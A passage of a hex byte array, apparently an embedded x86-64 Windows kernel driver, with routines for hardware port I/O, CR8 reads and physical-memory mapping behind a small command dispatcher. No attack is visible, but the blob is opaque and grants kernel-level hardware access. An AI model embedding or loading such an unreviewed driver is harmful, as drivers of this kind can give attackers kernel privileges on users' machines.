    0x50, 0x48, 0x83, 0xC4, 0x38, 0xC3, 0x66, 0x90, 0x02, 0x14, 0x00, 0x00, 0x21, 0x14, 0x00, 0x00,
    0x41, 0x14, 0x00, 0x00, 0x50, 0x19, 0x00, 0x00, 0x50, 0x19, 0x00, 0x00, 0x50, 0x19, 0x00, 0x00,
    0x60, 0x14, 0x00, 0x00, 0x83, 0x14, 0x00, 0x00, 0xA6, 0x14, 0x00, 0x00, 0x50, 0x19, 0x00, 0x00,
    0x50, 0x19, 0x00, 0x00, 0x50, 0x19, 0x00, 0x00, 0xC8, 0x14, 0x00, 0x00, 0xE7, 0x14, 0x00, 0x00,
    0x07, 0x15, 0x00, 0x00, 0x50, 0x19, 0x00, 0x00, 0x50, 0x19, 0x00, 0x00, 0x50, 0x19, 0x00, 0x00,
    0x26, 0x15, 0x00, 0x00, 0x49, 0x15, 0x00, 0x00, 0x6C, 0x15, 0x00, 0x00, 0x50, 0x19, 0x00, 0x00,
    0x50, 0x19, 0x00, 0x00, 0x50, 0x19, 0x00, 0x00, 0x8E, 0x15, 0x00, 0x00, 0xB5, 0x15, 0x00, 0x00,
    0xDC, 0x15, 0x00, 0x00, 0xF8, 0x15, 0x00, 0x00, 0x50, 0x19, 0x00, 0x00, 0x50, 0x19, 0x00, 0x00,
    0x50, 0x19, 0x00, 0x00, 0x50, 0x19, 0x00, 0x00, 0x50, 0x19, 0x00, 0x00, 0x50, 0x19, 0x00, 0x00,
    0x2F, 0x16, 0x00, 0x00, 0x14, 0x16, 0x00, 0x00, 0x4A, 0x16, 0x00, 0x00, 0x6A, 0x16, 0x00, 0x00,
    0x97, 0x16, 0x00, 0x00, 0xB7, 0x17, 0x00, 0x00, 0xD6, 0x17, 0x00, 0x00, 0xF5, 0x17, 0x00, 0x00,
    0x50, 0x19, 0x00, 0x00, 0x50, 0x19, 0x00, 0x00, 0x50, 0x19, 0x00, 0x00, 0x50, 0x19, 0x00, 0x00,
    0x3C, 0x18, 0x00, 0x00, 0xB8, 0x16, 0x00, 0x00, 0xFD, 0x16, 0x00, 0x00, 0x48, 0x17, 0x00, 0x00,
    0x93, 0x17, 0x00, 0x00, 0x50, 0x19, 0x00, 0x00, 0x50, 0x19, 0x00, 0x00, 0x1B, 0x18, 0x00, 0x00,
    0x7D, 0x18, 0x00, 0x00, 0xB0, 0x18, 0x00, 0x00, 0xD6, 0x18, 0x00, 0x00, 0x01, 0x19, 0x00, 0x00,
    0x2C, 0x19, 0x00, 0x00, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
    0x48, 0x53, 0x48, 0x81, 0xEC, 0x30, 0x01, 0x00, 0x00, 0x48, 0x85, 0xC9, 0x48, 0x8B, 0xD9, 0xB8,
    0x01, 0x00, 0x00, 0x00, 0x0F, 0x84, 0x70, 0x01, 0x00, 0x00, 0x48, 0x8B, 0x01, 0x48, 0xFF, 0xC8,
    0x48, 0x83, 0xF8, 0x06, 0x0F, 0x87, 0x5B, 0x01, 0x00, 0x00, 0x48, 0x8D, 0x0D, 0x6F, 0xE5, 0xFF,
    0xFF, 0x8B, 0x84, 0x81, 0xF4, 0x1B, 0x00, 0x00, 0x48, 0x03, 0xC1, 0xFF, 0xE0, 0xE8, 0x9E, 0x1C,
    0x00, 0x00, 0x66, 0x89, 0x43, 0x10, 0x33, 0xC0, 0x48, 0x81, 0xC4, 0x30, 0x01, 0x00, 0x00, 0x5B,
    0xC3, 0x48, 0x8D, 0x53, 0x14, 0x48, 0x8D, 0x4B, 0x18, 0xE8, 0x12, 0x1D, 0x00, 0x00, 0x89, 0x43,
    0x10, 0x33, 0xC0, 0x48, 0x81, 0xC4, 0x30, 0x01, 0x00, 0x00, 0x5B, 0xC3, 0x48, 0x8D, 0x4C, 0x24,
    0x20, 0x48, 0x8D, 0x53, 0x18, 0x41, 0xB8, 0x08, 0x01, 0x00, 0x00, 0xE8, 0xD0, 0x27, 0x00, 0x00,
    0x44, 0x8B, 0x83, 0x20, 0x01, 0x00, 0x00, 0x48, 0x8D, 0x93, 0x24, 0x01, 0x00, 0x00, 0x48, 0x8D,
    0x4C, 0x24, 0x20, 0xE8, 0xB8, 0x1D, 0x00, 0x00, 0x89, 0x43, 0x10, 0x33, 0xC0, 0x48, 0x81, 0xC4,
    0x30, 0x01, 0x00, 0x00, 0x5B, 0xC3, 0x48, 0x8D, 0x4C, 0x24, 0x20, 0x48, 0x8D, 0x53, 0x18, 0x41,
    0xB8, 0x08, 0x01, 0x00, 0x00, 0xE8, 0x96, 0x27, 0x00, 0x00, 0x8B, 0x93, 0x20, 0x01, 0x00, 0x00,
    0x4C, 0x8D, 0x83, 0x24, 0x01, 0x00, 0x00, 0x48, 0x8D, 0x4C, 0x24, 0x20, 0xE8, 0x4F, 0x1E, 0x00,
    0x00, 0x89, 0x43, 0x10, 0x33, 0xC0, 0x48, 0x81, 0xC4, 0x30, 0x01, 0x00, 0x00, 0x5B, 0xC3, 0x48,
    0x8D, 0x4C, 0x24, 0x20, 0x48, 0x8D, 0x53, 0x18, 0x41, 0xB8, 0x08, 0x01, 0x00, 0x00, 0xE8, 0x5D,
    0x27, 0x00, 0x00, 0x44, 0x8B, 0x83, 0x24, 0x01, 0x00, 0x00, 0x8B, 0x93, 0x20, 0x01, 0x00, 0x00,
    0x48, 0x8D, 0x4C, 0x24, 0x20, 0xE8, 0x96, 0x1E, 0x00, 0x00, 0x89, 0x43, 0x10, 0x33, 0xC0, 0x48,
    0x81, 0xC4, 0x30, 0x01, 0x00, 0x00, 0x5B, 0xC3, 0x48, 0x8D, 0x4C, 0x24, 0x20, 0x48, 0x8D, 0x53,
    0x18, 0x41, 0xB8, 0x08, 0x01, 0x00, 0x00, 0xE8, 0x24, 0x27, 0x00, 0x00, 0x44, 0x8B, 0x8B, 0x28,
    0x01, 0x00, 0x00, 0x44, 0x0F, 0xB6, 0x83, 0x24, 0x01, 0x00, 0x00, 0x8B, 0x93, 0x20, 0x01, 0x00,
    0x00, 0x48, 0x8D, 0x4C, 0x24, 0x20, 0xE8, 0x75, 0x1F, 0x00, 0x00, 0x89, 0x43, 0x10, 0x33, 0xC0,
    0x48, 0x81, 0xC4, 0x30, 0x01, 0x00, 0x00, 0x5B, 0xC3, 0x48, 0x8D, 0x4C, 0x24, 0x20, 0x48, 0x8D,
    0x53, 0x18, 0x41, 0xB8, 0x08, 0x01, 0x00, 0x00, 0xE8, 0xE3, 0x26, 0x00, 0x00, 0x48, 0x8D, 0x4C,
    0x24, 0x20, 0xE8, 0x29, 0x15, 0x00, 0x00, 0x89, 0x43, 0x10, 0x33, 0xC0, 0x48, 0x81, 0xC4, 0x30,
    0x01, 0x00, 0x00, 0x5B, 0xC3, 0xB8, 0x18, 0x20, 0x6A, 0xC8, 0x48, 0x81, 0xC4, 0x30, 0x01, 0x00,
    0x00, 0x5B, 0xC3, 0x90, 0x9D, 0x1A, 0x00, 0x00, 0xB1, 0x1A, 0x00, 0x00, 0xCC, 0x1A, 0x00, 0x00,
    0x06, 0x1B, 0x00, 0x00, 0x3F, 0x1B, 0x00, 0x00, 0x78, 0x1B, 0x00, 0x00, 0xB9, 0x1B, 0x00, 0x00,
    0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
    0x0F, 0xB7, 0xD1, 0xEC, 0xC3, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
    0x0F, 0xB7, 0xD1, 0x66, 0xED, 0xC3, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
    0x0F, 0xB7, 0xD1, 0xED, 0xC3, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
    0x0F, 0xB6, 0xC2, 0x0F, 0xB7, 0xD1, 0xEE, 0xB0, 0x01, 0xC3, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
    0x0F, 0xB7, 0xC2, 0x0F, 0xB7, 0xD1, 0x66, 0xEF, 0xB0, 0x01, 0xC3, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
    0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
    0x8B, 0xC2, 0x0F, 0xB7, 0xD1, 0xEF, 0xB0, 0x01, 0xC3, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
    0x48, 0x85, 0xC9, 0x74, 0x04, 0x0F, 0xB6, 0x01, 0xC3, 0x32, 0xC0, 0xC3, 0xCC, 0xCC, 0xCC, 0xCC,
    0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
    0x48, 0x85, 0xC9, 0x74, 0x04, 0x0F, 0xB7, 0x01, 0xC3, 0x66, 0x33, 0xC0, 0xC3, 0xCC, 0xCC, 0xCC,
    0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
    0x48, 0x85, 0xC9, 0x74, 0x03, 0x8B, 0x01, 0xC3, 0x33, 0xC0, 0xC3, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
    0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
    0x48, 0x85, 0xC9, 0x74, 0x0A, 0x88, 0x11, 0xF0, 0x83, 0x0C, 0x24, 0x00, 0xB0, 0x01, 0xC3, 0x32,
    0xC0, 0xC3, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
    0x48, 0x85, 0xC9, 0x74, 0x0B, 0x66, 0x89, 0x11, 0xF0, 0x83, 0x0C, 0x24, 0x00, 0xB0, 0x01, 0xC3,
    0x32, 0xC0, 0xC3, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
    0x48, 0x85, 0xC9, 0x74, 0x0A, 0x89, 0x11, 0xF0, 0x83, 0x0C, 0x24, 0x00, 0xB0, 0x01, 0xC3, 0x32,
    0xC0, 0xC3, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
    0x48, 0x83, 0xEC, 0x28, 0xB8, 0x1F, 0x85, 0xEB, 0x51, 0x48, 0x89, 0x5C, 0x24, 0x40, 0x8B, 0xD9,
    0xF7, 0xE1, 0xC1, 0xEA, 0x04, 0x74, 0x21, 0x48, 0x89, 0x7C, 0x24, 0x48, 0x8B, 0xFA, 0x66, 0x90,
    0xB9, 0x32, 0x00, 0x00, 0x00, 0xFF, 0x15, 0x85, 0x42, 0x00, 0x00, 0x83, 0xC3, 0xCE, 0x48, 0xFF,
    0xCF, 0x75, 0xED, 0x48, 0x8B, 0x7C, 0x24, 0x48, 0x85, 0xDB, 0x74, 0x08, 0x8B, 0xCB, 0xFF, 0x15,
    0x6C, 0x42, 0x00, 0x00, 0x48, 0x8B, 0x5C, 0x24, 0x40, 0x48, 0x83, 0xC4, 0x28, 0xC3, 0xCC, 0xCC,
    0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
    0x33, 0xC9, 0x48, 0xFF, 0x25, 0x4F, 0x42, 0x00, 0x00, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
    0x48, 0x83, 0xEC, 0x28, 0x48, 0x85, 0xC9, 0x74, 0x08, 0x33, 0xD2, 0xFF, 0x15, 0x67, 0x42, 0x00,
    0x00, 0x48, 0x83, 0xC4, 0x28, 0xC3, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
    0x48, 0x85, 0xD2, 0x74, 0x6D, 0x45, 0x33, 0xC9, 0x48, 0x8D, 0x05, 0x91, 0x53, 0x00, 0x00, 0x4C,
    0x8D, 0x15, 0x0A, 0xE2, 0xFF, 0xFF, 0x45, 0x33, 0xC0, 0x66, 0x66, 0x90, 0x66, 0x66, 0x66, 0x90,
    0x4B, 0x39, 0x94, 0x10, 0x60, 0x7A, 0x3D, 0x00, 0x75, 0x0A, 0x4B, 0x3B, 0x8C, 0x10, 0x40, 0x7A,
    0x3D, 0x00, 0x74, 0x21, 0x48, 0x39, 0x50, 0x08, 0x75, 0x05, 0x48, 0x3B, 0x08, 0x74, 0x24, 0x49,
    0x83, 0xC0, 0x28, 0x49, 0xFF, 0xC1, 0x48, 0x83, 0xC0, 0x50, 0x49, 0x81, 0xF8, 0x80, 0x84, 0x1E,
    0x00, 0x72, 0xCD, 0xEB, 0x1D, 0x4B, 0x8D, 0x04, 0x89, 0x49, 0x8B, 0x8C, 0xC2, 0x48, 0x7A, 0x3D,
    0x00, 0xEB, 0x0F, 0x4B, 0x8D, 0x04, 0x89, 0x48, 0x03, 0xC0, 0x49, 0x8B, 0x8C, 0xC2, 0x50, 0x71,
    0x00, 0x00, 0x48, 0x85, 0xC9, 0x74, 0x07, 0x48, 0xFF, 0x25, 0xE2, 0x41, 0x00, 0x00, 0x33, 0xC0,
    0xC3, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
    0x48, 0x53, 0x48, 0x83, 0xEC, 0x20, 0x48, 0x8B, 0xD9, 0x4C, 0x0F, 0x20, 0xC0, 0x3C, 0x02, 0x77,
    0x08, 0x0F, 0xB6, 0xD2, 0xE8, 0x77, 0x27, 0x00, 0x00, 0x48, 0x8B, 0xC3, 0x48, 0x83, 0xC4, 0x20,
    0x5B, 0xC3, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
    0x48, 0x53, 0x48, 0x83, 0xEC, 0x20, 0x48, 0x8B, 0xD9, 0x4C, 0x0F, 0x20, 0xC0, 0x3C, 0x02, 0x77,
    0x05, 0xE8, 0xFA, 0x23, 0x00, 0x00, 0x48, 0x8B, 0xC3, 0x48, 0x83, 0xC4, 0x20, 0x5B, 0xC3, 0xCC,
    0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
    0x48, 0x85, 0xC9, 0x74, 0x0C, 0xB8, 0x01, 0x00, 0x00, 0x00, 0xF0, 0x0F, 0xC1, 0x01, 0xFF, 0xC0,
    0xC3, 0x33, 0xC0, 0xC3, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
    0x48, 0x85, 0xC9, 0x74, 0x0C, 0xB8, 0xFF, 0xFF, 0xFF, 0xFF, 0xF0, 0x0F, 0xC1, 0x01, 0xFF, 0xC8,
    0xC3, 0x33, 0xC0, 0xC3, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
    0x48, 0x85, 0xC9, 0x74, 0x08, 0x8B, 0xC2, 0xF0, 0x44, 0x0F, 0xB1, 0x01, 0xC3, 0x33, 0xC0, 0xC3,
    0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
    0x48, 0x89, 0x4C, 0x24, 0x08, 0x48, 0x89, 0x54, 0x24, 0x10, 0x4C, 0x89, 0x44, 0x24, 0x18, 0x4C,
    0x89, 0x4C, 0x24, 0x20, 0x48, 0x81, 0xEC, 0x38, 0x04, 0x00, 0x00, 0x48, 0x8B, 0x05, 0xB6, 0x51,
    0x00, 0x00, 0x48, 0x89, 0x84, 0x24, 0x20, 0x04, 0x00, 0x00, 0x80, 0x3D, 0xC7, 0x51, 0x00, 0x00,
    0x01, 0x75, 0x72, 0x48, 0x85, 0xC9, 0x74, 0x6D, 0x48, 0x8B, 0xD1, 0x4C, 0x8D, 0x84, 0x24, 0x48,
    0x04, 0x00, 0x00, 0x48, 0x8D, 0x8C, 0x24, 0x20, 0x02, 0x00, 0x00, 0xFF, 0x15, 0xD7, 0x40, 0x00,
    0x00, 0x48, 0x8B, 0x05, 0xB8, 0x2B, 0x00, 0x00, 0x4C, 0x8D, 0x5C, 0x24, 0x20, 0x49, 0x89, 0x03,
    0x0F, 0xB6, 0x05, 0xB1, 0x2B, 0x00, 0x00, 0x48, 0x8D, 0x94, 0x24, 0x20, 0x02, 0x00, 0x00, 0x48,
    0x8D, 0x4C, 0x24, 0x28, 0x41, 0xB8, 0xF3, 0x01, 0x00, 0x00, 0x41, 0x88, 0x43, 0x08, 0xFF, 0x15,
    0x9C, 0x40, 0x00, 0x00, 0x48, 0x8D, 0x4C, 0x24, 0x20, 0xE8, 0x32, 0x27, 0x00, 0x00, 0x33, 0xC0,
    0x48, 0x8B, 0x8C, 0x24, 0x20, 0x04, 0x00, 0x00, 0xE8, 0x43, 0x27, 0x00, 0x00, 0x48, 0x81, 0xC4,
    0x38, 0x04, 0x00, 0x00, 0xC3, 0xB8, 0x0B, 0x80, 0x6A, 0xC8, 0x48, 0x8B, 0x8C, 0x24, 0x20, 0x04,
    0x00, 0x00, 0xE8, 0x29, 0x27, 0x00, 0x00, 0x48, 0x81, 0xC4, 0x38, 0x04, 0x00, 0x00, 0xC3, 0xCC,
    0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
    0x88, 0x0D, 0x22, 0x51, 0x00, 0x00, 0xC3, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
    0x48, 0x85, 0xC9, 0x74, 0x07, 0x48, 0xFF, 0x25, 0x24, 0x40, 0x00, 0x00, 0x33, 0xC0, 0xC3, 0xCC,
    0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
    0x48, 0x8B, 0xC4, 0x48, 0x83, 0xEC, 0x58, 0x48, 0x89, 0x58, 0x08, 0x48, 0x89, 0x68, 0x10, 0x48,
    0x89, 0x70, 0x18, 0x48, 0x89, 0x78, 0x20, 0x33, 0xF6, 0x4C, 0x89, 0x60, 0xF8, 0x4C, 0x89, 0x68,
    0xF0, 0x4D, 0x8B, 0xE0, 0x8B, 0xFA, 0x8B, 0xDE, 0x89, 0x70, 0xD8, 0x48, 0x8B, 0xE9, 0x4C, 0x8D,
    0x2D, 0xDB, 0x59, 0x3D, 0x00, 0x66, 0x66, 0x66, 0x90, 0x66, 0x66, 0x90, 0x66, 0x66, 0x66, 0x90,
    0x8B, 0xC3, 0x48, 0x8D, 0x4C, 0x24, 0x30, 0x4C, 0x8D, 0x0C, 0x80, 0x33, 0xC0, 0xF0, 0x4B, 0x0F,
    0xB1, 0x4C, 0xCD, 0x18, 0x74, 0x14, 0x8B, 0x5C, 0x24, 0x30, 0xFF, 0xC3, 0x81, 0xFB, 0x50, 0xC3,
    0x00, 0x00, 0x89, 0x5C, 0x24, 0x30, 0x72, 0xD8, 0xEB, 0x04, 0x8B, 0x5C, 0x24, 0x30, 0x44, 0x8B,
    0xC2, 0x48, 0x8D, 0x0D, 0xC8, 0x2B, 0x00, 0x00, 0x8B, 0xD3, 0xE8, 0x81, 0xFE, 0xFF, 0xFF, 0x48,
    0x8D, 0x0D, 0x7A, 0x2B, 0x00, 0x00, 0xBA, 0x00, 0x9E, 0xFF, 0x01, 0xE8, 0x70, 0xFE, 0xFF, 0xFF,
    0x81, 0xFB, 0x50, 0xC3, 0x00, 0x00, 0x0F, 0x83, 0xC5, 0x00, 0x00, 0x00, 0x48, 0x8D, 0x0D, 0x1D,
    0x2B, 0x00, 0x00, 0x48, 0x8B, 0xD5, 0xE8, 0x55, 0xFE, 0xFF, 0xFF, 0x45, 0x33, 0xC9, 0x45, 0x33,
    0xC0, 0x8B, 0xD7, 0x48, 0x8B, 0xCD, 0x48, 0x89, 0x74, 0x24, 0x20, 0xFF, 0x15, 0x87, 0x3F, 0x00,
    0x00, 0x48, 0x85, 0xC0, 0x48, 0x8B, 0xF8, 0x0F, 0x84, 0x88, 0x00, 0x00, 0x00, 0x48, 0x8B, 0xC8,
    0xFF, 0x15, 0x6A, 0x3F, 0x00, 0x00, 0x41, 0xB8, 0x01, 0x00, 0x00, 0x00, 0x45, 0x33, 0xC9, 0x48,
    0x8B, 0xCF, 0x41, 0x0F, 0xB6, 0xD0, 0xC7, 0x44, 0x24, 0x28, 0x10, 0x00, 0x00, 0x00, 0x89, 0x74,
    0x24, 0x20, 0xFF, 0x15, 0x40, 0x3F, 0x00, 0x00, 0x48, 0x85, 0xC0, 0x48, 0x8B, 0xF0, 0x75, 0x17,
    0x48, 0x8D, 0x0D, 0x79, 0x2A, 0x00, 0x00, 0xE8, 0xF4, 0xFD, 0xFF, 0xFF, 0x48, 0x8B, 0xCF, 0xFF,
    0x15, 0x1B, 0x3F, 0x00, 0x00, 0xEB, 0x4A, 0x48, 0x8D, 0x0D, 0x32, 0x2A, 0x00, 0x00, 0x48, 0x8B,
    0xD0, 0xE8, 0xDA, 0xFD, 0xFF, 0xFF, 0x44, 0x8B, 0xDB, 0x4B, 0x8D, 0x0C, 0x9B, 0x49, 0x89, 0x74,
    0xCD, 0x18, 0x49, 0x89, 0x7C, 0xCD, 0x10, 0x49, 0x89, 0x6C, 0xCD, 0x08, 0x4D, 0x89, 0x64, 0xCD,
    0x20, 0x8B, 0x47, 0x2C, 0x48, 0x81, 0xE6, 0x00, 0xF0, 0xFF, 0xFF, 0x48, 0x03, 0xC6, 0x49, 0x89,
    0x44, 0xCD, 0x00, 0xEB, 0x0F, 0x48, 0x8D, 0x0D, 0xC4, 0x29, 0x00, 0x00, 0xE8, 0x9F, 0xFD, 0xFF,
    0xFF, 0x48, 0x8B, 0xC6, 0x4C, 0x8B, 0x6C, 0x24, 0x48, 0x4C, 0x8B, 0x64, 0x24, 0x50, 0x48, 0x8B,
    0x7C, 0x24, 0x78, 0x48, 0x8B, 0x74, 0x24, 0x70, 0x48, 0x8B, 0x6C, 0x24, 0x68, 0x48, 0x8B, 0x5C,
    0x24, 0x60, 0x48, 0x83, 0xC4, 0x58, 0xC3, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
    0x48, 0x83, 0xEC, 0x28, 0x48, 0x85, 0xC9, 0x48, 0x89, 0x5C, 0x24, 0x48, 0x48, 0x89, 0x7C, 0x24,
    0x20, 0x48, 0x8B, 0xF9, 0x41, 0x8B, 0xD8, 0x74, 0x23, 0x45, 0x85, 0xC0, 0x74, 0x1E, 0x48, 0x8B,
    0xD1, 0x48, 0x8D, 0x0D, 0xD8, 0x2A, 0x00, 0x00, 0x44, 0x8B, 0xC3, 0xE8, 0x40, 0xFD, 0xFF, 0xFF,
    0x48, 0x8B, 0xD3, 0x48, 0x8B, 0xCF, 0xFF, 0x15, 0x84, 0x3E, 0x00, 0x00, 0x48, 0x8B, 0x7C, 0x24,
    0x20, 0x48, 0x8B, 0x5C, 0x24, 0x48, 0x33, 0xC0, 0x48, 0x83, 0xC4, 0x28, 0xC3, 0xCC, 0xCC, 0xCC,
    0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
    0x48, 0x8B, 0xC4, 0x48, 0x83, 0xEC, 0x58, 0x48, 0x85, 0xC9, 0x48, 0x89, 0x68, 0xF0, 0x48, 0x89,
    0x70, 0xE8, 0x4C, 0x89, 0x60, 0xD8, 0x49, 0x8B, 0xE9, 0x48, 0x8B, 0xF1, 0x45, 0x8B, 0xE0, 0x0F,
    0x84, 0x5C, 0x01, 0x00, 0x00, 0x45, 0x85, 0xC0, 0x0F, 0x84, 0x53, 0x01, 0x00, 0x00, 0x48, 0x89,
    0x58, 0xF8, 0x48, 0x89, 0x78, 0xE0, 0x48, 0x8B, 0xD1, 0x4C, 0x89, 0x68, 0xD0, 0x48, 0x8D, 0x0D,
    0x8C, 0x2C, 0x00, 0x00, 0x45, 0x8B, 0xC4, 0x4C, 0x89, 0x70, 0xC8, 0xE8, 0xC0, 0xFC, 0xFF, 0xFF,
    0x4C, 0x8D, 0x2D, 0xC9, 0x57, 0x3D, 0x00, 0x45, 0x33, 0xF6, 0x49, 0x8B, 0xDD, 0x41, 0x8B, 0xFE,
    0x4C, 0x8B, 0x03, 0x48, 0x8D, 0x0D, 0x16, 0x2C, 0x00, 0x00, 0x4C, 0x8B, 0xCE, 0x8B, 0xD7, 0xE8,
    0x9C, 0xFC, 0xFF, 0xFF, 0x48, 0x3B, 0x6B, 0x20, 0x75, 0x05, 0x48, 0x3B, 0x33, 0x74, 0x13, 0xFF,
    0xC7, 0x48, 0x83, 0xC3, 0x28, 0x81, 0xFF, 0x50, 0xC3, 0x00, 0x00, 0x72, 0xD3, 0xE9, 0xAA, 0x00,
    0x00, 0x00, 0x48, 0x8D, 0x0D, 0xB7, 0x2B, 0x00, 0x00, 0x8B, 0xD7, 0xE8, 0x70, 0xFC, 0xFF, 0xFF,
    0x44, 0x8B, 0xDF, 0x4B, 0x8D, 0x1C, 0x9B, 0x4D, 0x39, 0x74, 0xDD, 0x10, 0x74, 0x30, 0x4D, 0x39,
    0x74, 0xDD, 0x18, 0x74, 0x29, 0x48, 0x8D, 0x0D, 0x64, 0x2B, 0x00, 0x00, 0xE8, 0x4F, 0xFC, 0xFF,
    0xFF, 0x49, 0x8B, 0x54, 0xDD, 0x10, 0x49, 0x8B, 0x4C, 0xDD, 0x18, 0xFF, 0x15, 0x97, 0x3D, 0x00,
    0x00, 0x49, 0x8B, 0x4C, 0xDD, 0x10, 0xFF, 0x15, 0x64, 0x3D, 0x00, 0x00, 0xEB, 0x0C, 0x48, 0x8D,
    0x0D, 0xEB, 0x2A, 0x00, 0x00, 0xE8, 0x26, 0xFC, 0xFF, 0xFF, 0x4D, 0x39, 0x74, 0xDD, 0x08, 0x74,
    0x1A, 0x48, 0x8D, 0x0D, 0x98, 0x2A, 0x00, 0x00, 0xE8, 0x13, 0xFC, 0xFF, 0xFF, 0x49, 0x8B, 0x4C,
    0xDD, 0x08, 0x49, 0x8B, 0xD4, 0xFF, 0x15, 0x55, 0x3D, 0x00, 0x00, 0x49, 0x8B, 0x44, 0xDD, 0x18,
    0x4D, 0x89, 0x74, 0xDD, 0x10, 0x4D, 0x89, 0x74, 0xDD, 0x08, 0x4D, 0x89, 0x74, 0xDD, 0x00, 0x4D,
    0x89, 0x74, 0xDD, 0x20, 0xF0, 0x4D, 0x0F, 0xB1, 0x74, 0xDD, 0x18, 0x49, 0x8B, 0x54, 0xDD, 0x18,
    0x48, 0x8D, 0x0D, 0x09, 0x2A, 0x00, 0x00, 0xE8, 0xD4, 0xFB, 0xFF, 0xFF, 0x4C, 0x8B, 0x6C, 0x24,
    0x28, 0x48, 0x8B, 0x5C, 0x24, 0x50, 0x81, 0xFF, 0x50, 0xC3, 0x00, 0x00, 0x48, 0x8B, 0x7C, 0x24,
    0x38, 0x75, 0x12, 0x48, 0x8D, 0x0D, 0x96, 0x29, 0x00, 0x00, 0x45, 0x8B, 0xC4, 0x48, 0x8B, 0xD6,
    0xE8, 0xAB, 0xFB, 0xFF, 0xFF, 0x41, 0x8B, 0xC6, 0x4C, 0x8B, 0x74, 0x24, 0x20, 0x4C, 0x8B, 0x64,
    0x24, 0x30, 0x48, 0x8B, 0x74, 0x24, 0x40, 0x48, 0x8B, 0x6C, 0x24, 0x48, 0x48, 0x83, 0xC4, 0x58,
    0xC3, 0x4C, 0x8B, 0x64, 0x24, 0x30, 0x48, 0x8B, 0x74, 0x24, 0x40, 0x48, 0x8B, 0x6C, 0x24, 0x48,
    0xB8, 0x01, 0x00, 0x00, 0x00, 0x48, 0x83, 0xC4, 0x58, 0xC3, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
    0x48, 0x83, 0xEC, 0x38, 0x48, 0x89, 0x6C, 0x24, 0x48, 0x48, 0x89, 0x74, 0x24, 0x50, 0x4C, 0x89,
    0x64, 0x24, 0x30, 0xB8, 0x1F, 0x85, 0xEB, 0x51, 0x48, 0x89, 0x5C, 0x24, 0x40, 0x44, 0x8B, 0xE1,
    0xBE, 0xE8, 0x03, 0x00, 0x00, 0x48, 0x89, 0x7C, 0x24, 0x58, 0xF7, 0xE1, 0x8B, 0xEA, 0xC1, 0xED,
